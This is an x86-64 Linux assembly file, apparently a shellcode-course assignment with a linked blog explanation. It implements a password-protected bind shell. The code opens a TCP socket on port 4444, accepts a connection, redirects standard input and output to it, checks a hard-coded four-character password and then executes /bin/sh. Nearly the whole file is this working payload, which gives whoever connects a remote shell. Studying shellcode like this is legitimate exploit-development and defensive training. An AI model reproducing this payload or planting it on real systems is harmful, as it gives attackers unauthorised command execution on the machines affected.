;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.
;
; For a detailed explanation of this shellcode see my blog post: 
; http://a41l4.blogspot.ca/2017/02/assignment-1a.html

global _start
section .text
_start:
; Socket
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq
	syscall
; Bind
	xchg edi,eax ; eax now equals 2, edi equals socket descriptor
	push rdx
	push rax ; already has 2 in it
	mov word [rsp + 2], 0x5c11 ; port 4444 in network byte order (big endian)
	push rsp
	pop rsi
	push rax ; has 2 in it	
	mov al, 49	
	mov dl, 16
	syscall
; Listen
	mov al, 50
	pop rsi ; pops in 2 from the rax push
	syscall
; Accept
	push rsp ; rsp points to the 16 byte structure used for the original socket
	pop rsi
	push rdx ; still has 16 in it from the Bind call
	push rsp
	pop rdx ; now points to where 16 is on stack
	mov al, 43
        syscall
	xchg eax, edx ; save accepted connection socket for later
; Close
	push 3
	pop rax
	push rax ; save 3 to be popped into rsi later.
	syscall
; Dup 2
	xchg edx,edi ; puts accepted connection socket into rdi
	pop rsi
dup2loop:	
	mov al, 33 ; rax was left at 0 from the Close syscall
	dec esi
        syscall
	loopnz dup2loop
; Read
	; rax and rsi are zero from the result of the last dup2 syscall and loop
	pop rdx ; pop 16 from stack to indicate bytes to read
	push rsp
	pop rsi ; lets use the stack for our buffer.
		; RDI still has our sockfd socket descriptor
		; RAX is already set to 0 the syscall number for Read
	syscall
	pop rsi
	sub esi, '1434' ; compare with our 4 character password, simultaneously zero rsi
	jnz _start ; Jump back to the start so we know what causes the segfault
; Execve
	cdq ; zero rdx, this is safe because we know value of rax should be between 4 and 16
        push rdx ; zero terminator for the following string that we are pushing

        ; push /bin//sh in reverse
        mov rbx, '/bin//sh'
        push rbx

        ; store /bin//sh address in RDI
	push rsp
	pop rdi

        ; Call the Execve syscall
	mov al, 59
        syscall

	






	
	

 
